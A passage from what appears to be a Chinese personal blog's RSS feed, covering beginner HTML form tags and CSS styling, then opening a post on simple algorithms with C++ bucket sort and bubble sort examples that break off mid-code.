class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>文本输入框：<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span>/&gt;</span></span><br><span class="line">        </span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>密码框：<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> /&gt;</span></span><br><span class="line">        </span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>复选框：<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span>/&gt;</span>A</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span>/&gt;</span>B</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span>/&gt;</span>C</span><br><span class="line">        </span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>单选框：<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"***"</span>/&gt;</span>a</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"***"</span>/&gt;</span>b</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"***"</span>/&gt;</span>c</span><br><span class="line">        <span class="comment">&lt;!--name里面内容相同--&gt;</span></span><br><span class="line">        </span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>上传文件<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> /&gt;</span></span><br><span class="line">        </span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line">        </span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>重置<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"reset"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>看下效果：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/html_2.jpg" alt="表单标签"></p><p>升级版：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://..."</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>文本输入框：<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">placeholder</span>=<span class="string">"请输入用户名"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>密码框：<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">placeholder</span>=<span class="string">"请输入密码"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>复选框：<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">checked</span>&gt;</span>A</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">disabled</span>/&gt;</span>B</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span>/&gt;</span>C</span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><blockquote><p>1、form标签里面的action：当点击提交后，后台会把你的信息提交并跳转到该网址</p><p>2、input标签里面的placeholder：placeholder后面所写内容会出现在文本/密码框里</p><p>3、input标签里面的checked：该选项默认被选中，disabled是：该选项不能被选中</p></blockquote><p>来看看效果：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/html_3.jpg" alt="表单标签"></p><p>表单相关标签</p><p>●  &lt; textarea &gt;：多行文本框</p><p>●  &lt; select &gt;、&lt; option &gt;：下拉菜单</p><p>●  &lt; label &gt;：辅助表单</p><p>代码：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://..."</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>多行文本框<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">cols</span>=<span class="string">"30"</span> <span class="attr">rows</span>=<span class="string">"15"</span>&gt;</span> <span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>下拉菜单<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">selected</span>&gt;</span>请选择<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>济南<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>青岛<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>枣庄<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>烟台<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">selected</span>&gt;</span>请选择<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>济南<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>青岛<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>枣庄<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>烟台<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">multiple</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">selected</span>&gt;</span>请选择<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>济南<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>青岛<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>枣庄<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>烟台<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"***"</span> <span class="attr">id</span>=<span class="string">"man"</span>/&gt;</span><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"man"</span>&gt;</span>男<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"***"</span> <span class="attr">id</span>=<span class="string">"woman"</span>/&gt;</span><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"woman"</span>&gt;</span>女<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><blockquote><p>倒数3、4行里面的id和for里面内容一致，这样会实现：点击名称也会选中选选项</p></blockquote><p>看下效果：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/html_4.jpg" alt="表单标签"></p><h4 id="div-span标签"><a href="#div-span标签" class="headerlink" title="div+span标签"></a>div+span标签</h4><p>●  div（块）：&lt; div &gt;标签用来划分一个区域，相当于一块区域容器，可以容纳段落、标题、表格、图像等各种网</p><p>页元素；HTML中大多数的标签都可以嵌套在&lt; div &gt;标签中，&lt; div &gt;中还可以嵌套多层&lt; div &gt;，用来将网页分割成</p><p>独立的、不同的部分，来实现网页的规划和布局。</p><p>●  span（内联）：&lt; span &gt;标签用来修饰文字的，div与span都是没有任何默认样式的，需要配合CSS来使用。</p><blockquote><p>这里先不写这两种标签用法，先学习学习CSS</p></blockquote><h1 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h1><h2 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h2><blockquote><p>选择器{属性1： 值1；属性2：值2…}</p><p>width：宽</p><p>height：高</p><p>background-color：背景颜色</p><p>单位：px —&gt; 像素  % —&gt; 百分比 </p></blockquote><p>用法：在<strong>*&lt; head &gt;&lt; /head &gt;*</strong>里面写一下内容：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">div{</span><br><span class="line">width: 100px;</span><br><span class="line">height: 100px;</span><br><span class="line">background-color: aqua;</span><br><span class="line">}</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><h2 id="Start-1"><a href="#Start-1" class="headerlink" title="Start"></a>Start</h2><h3 id="内联样式与内部样式"><a href="#内联样式与内部样式" class="headerlink" title="内联样式与内部样式"></a>内联样式与内部样式</h3><blockquote><p>内联样式：style属性</p><p>内部样式：style标签</p></blockquote><h4 id="内联样式："><a href="#内联样式：" class="headerlink" title="内联样式："></a>内联样式：</h4><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"width: 200px;height: 100px;background-color: aquamarine;"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><h4 id="内部样式："><a href="#内部样式：" class="headerlink" title="内部样式："></a>内部样式：</h4><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css"><span class="selector-tag">div</span>{<span class="attribute">width</span>: <span class="number">200px</span>;<span class="attribute">height</span>: <span class="number">100px</span>;<span class="attribute">background-color</span>: aquamarine}</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><h4 id="区别："><a href="#区别：" class="headerlink" title="区别："></a>区别：</h4><blockquote><p>1、内联样式在HTML标签上添加style属性</p><p>2、内部样式在&lt; style &gt;标签内添加样式</p><p>3、内部样式优点：代码可以复用，可以使结构和样式分开处理；</p></blockquote><h3 id="外部样式"><a href="#外部样式" class="headerlink" title="外部样式"></a>外部样式</h3><blockquote><p>引入一个单独的CSS文件！!</p></blockquote><p><strong>*&lt; link &gt;标签：引入外部资源(写在head标签内部)*</strong></p><p><strong><em>rel属性：指定资源跟页面的关系</em></strong></p><p><strong><em>href属性：资源的地址</em></strong></p><p>基本格式：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"./style.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><h3 id="CSS颜色表示"><a href="#CSS颜色表示" class="headerlink" title="CSS颜色表示"></a>CSS颜色表示</h3><h4 id="1、单词表示法"><a href="#1、单词表示法" class="headerlink" title="1、单词表示法"></a>1、单词表示法</h4><p>用英文单词直接表示（看你单词水平厉不厉害）</p><h4 id="2、16进制表示法"><a href="#2、16进制表示法" class="headerlink" title="2、16进制表示法"></a>2、16进制表示法</h4><p>表示方法：‘#’ + 6位16进制数  </p><p>取值范围：#000000 – #ffffff</p><h4 id="3、RGB三原色表示法-红绿蓝"><a href="#3、RGB三原色表示法-红绿蓝" class="headerlink" title="3、RGB三原色表示法(红绿蓝)"></a>3、RGB三原色表示法(红绿蓝)</h4><p>表示方法：rgb(x,y,z) </p><p>x,y,z取值范围：0~255</p><h3 id="CSS背景样式"><a href="#CSS背景样式" class="headerlink" title="CSS背景样式"></a>CSS背景样式</h3><blockquote><p>background-color：背景颜色</p><p>background-image：背景图</p><p>background-repeat：背景图片的平铺方</p><p>background-position：背景图片的位置</p><p>background-attachment：背景图随滚动条的移动方式</p></blockquote><p>1、background-color：背景颜色</p><p>2、background-image：背景图片</p><p>​    ● url（背景地址）</p><p>​    ● 默认：水平垂直铺满背景图</p><p>3、background-repeat：背景图片的平铺方式</p><p>​    ● repeat-x：x轴平铺</p><p>​    ● repeat-y：y轴平铺</p><p>​    ● repeat：x，y都平铺（默认值）</p><p>​    ● no-repeat：x，y都不平铺</p><p>4、background-position：背景图片的位置</p><p>格式：x     y </p><p>​    ● x和y可以是数字（单位px），可以用百分数</p><p>​    ● x和y可以是英文单词，left、center、right、top、bottom…随意搭配</p><p>5、background-attachment：背景图随滚动条的移动方式   常用值：</p><p>​    ● scroll：默认值：背景元素按照当前元素进行偏移</p><p>​    ● fixed：背景位置是按照浏览器进行偏移</p><p>简单使用：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">div{</span><br><span class="line">width: 600px;height: 600px;   </span><br><span class="line">background-color: aqua;</span><br><span class="line">background-image: url(../img/picture.jpg); </span><br><span class="line">background-repeat: no-repeat;</span><br><span class="line">background-position: left center;</span><br><span class="line">background-attachment: scroll;</span><br><span class="line">}</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content:encoded>
      
      <comments>https://www.los-kos.cn/posts/html-css/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Algorithm——简单算法总结</title>
      <link>https://www.los-kos.cn/posts/algorithm/</link>
      <guid>https://www.los-kos.cn/posts/algorithm/</guid>
      <pubDate>Thu, 05 Mar 2020 10:13:00 GMT</pubDate>
      <description>
      
        喜欢研究算法，专为算法打造
      
      </description>
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p>这篇博客很早就想整理了，一直没有时间，今天上课，课余时间真的不多，那就来整理一波；</p><a id="more"></a><h2 id="算法前言"><a href="#算法前言" class="headerlink" title="算法前言"></a>算法前言</h2><p>算法（Algorithm）是指解题方案的准确而完整的描述，是一系列解决问题的清晰指令，算法代表着用系统的方法</p><p>描述解决问题的策略机制；简单来讲，就是解决问题的方法和机制；</p><h3 id="算法特点"><a href="#算法特点" class="headerlink" title="算法特点"></a>算法特点</h3><p>1、有穷性：算法在执行有限的步骤之后，自动结束而不会出现无限循环，并且每一步骤在可接受的时间内完成；</p><p>2、确定性：算法的每一步骤都有确定的含义，不会出现二义性；</p><p>3、可行性：算法的每一步都必须是可行的，也就是说，每一步都能够通过执行有限次数完成;</p><p>4、输入输出：0至多个输入，1至多个输出；</p><h3 id="我所了解的算法"><a href="#我所了解的算法" class="headerlink" title="我所了解的算法"></a>我所了解的算法</h3><p>第一个接触的算法叫做排序，分了很多种（桶，冒泡，归并，快速）；二分法，前缀和与差分法，枚举法，bfs，</p><p>dfs，还有栈，队列等等；</p><h3 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h3><p>在接下来的一些时间里，快速学习多种算法，达到速成的效果；</p><h2 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h2><p>先说明一下，blog这东西很离谱，老是出现毛病，这篇博客全部用C++来写，但是代码标注是cpp，因为标注</p><p>C++的时候，到了网页上面就是部分代码残缺，2333</p><h3 id="Unix时间戳"><a href="#Unix时间戳" class="headerlink" title="Unix时间戳"></a>Unix时间戳</h3><p>讲算法之前，先说一个实用的东西——Unix时间戳；</p><p>Unix时间戳是从1970年1月1日开始所经过的秒数，不考虑闰秒。</p><p>这个是柠檬大佬给我写的（自己太菜）；</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">time_t</span> now;</span><br><span class="line"><span class="keyword">int</span> Time=time(&amp;now);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"现在的时间为"</span> &lt;&lt; Time &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="Sort"><a href="#Sort" class="headerlink" title="Sort"></a>Sort</h3><h4 id="桶排序（Bucket-Sort）"><a href="#桶排序（Bucket-Sort）" class="headerlink" title="桶排序（Bucket Sort）"></a>桶排序（Bucket Sort）</h4><p>首先，我们来看桶排序。桶排序，顾名思义，会用到“桶”，核心思想是将要排序的数据分到几个有序的桶里，每个</p><p>桶里的数据再单独进行排序。桶内排完序之后，再把每个桶里的数据按照顺序依次取出，组成的序列就是有序的</p><p>了；</p><h5 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h5><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> bucket[<span class="number">101</span>],i,j,t,n;</span><br><span class="line"><span class="built_in">memset</span>(bucket,<span class="number">0</span>,<span class="keyword">sizeof</span>(bucket));  <span class="comment">//数组全体置为 0 </span></span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; n;  <span class="comment">//输入一个数字 n，表示有 n个数 </span></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++) <span class="comment">//循环读入 n个数，并进行桶排序 </span></span><br><span class="line">{</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;t);   <span class="comment">//把每次读入的数字用变量 t保存 </span></span><br><span class="line">bucket[t]++;<span class="comment">//进行计数，对编号为 t的桶加一 </span></span><br><span class="line">}</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">101</span>;i++)  <span class="comment">//依次判断编号为 0-100 的桶 </span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;=bucket[i];j++)  <span class="comment">// 出现几次就将桶打印几次 </span></span><br><span class="line">{</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; i &lt;&lt; <span class="string">' '</span>;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h5><p>设桶的个数为m，待排序数的个数为n；</p><p>第8行执行了m次，第13行执行了n次，第16行和第19行共执行了m+n次，所以程序共执行了2（m+n)次，时间复</p><p>杂度即为O（2*（m+n）），即O（m+n）；</p><h4 id="冒泡排序（Bubble-Sort）"><a href="#冒泡排序（Bubble-Sort）" class="headerlink" title="冒泡排序（Bubble Sort）"></a>冒泡排序（Bubble Sort）</h4><p>其次，我们来看冒泡排序。冒泡排序基本思想是：每次比较两个相邻的元素，如果它们的顺序错误就把它们交换过</p><p>来；</p><h5 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h5><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span> *a,<span class="keyword">int</span> *b)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> t;</span><br><span class="line">t=*a,*a=*b,*b=t;</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> i,j,n;</span><br><span class="line"><span class="keyword">int</span> bubble[<span class="number">100</span>]; </span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; n; <span class="comment">// 输入一个n，表示有n个数。 </span></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; bubble[i];<span class="comment">// 循环读入n个数，放入数组中 </span></span><br><span class="line">}</span><br><span class="line"><span class="comment">//下面是冒泡排序核心</span></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)   <span class="comment">//外层for循环控制循环次数 </span></span><br><span class="line">{</span><br><span class="line"><span 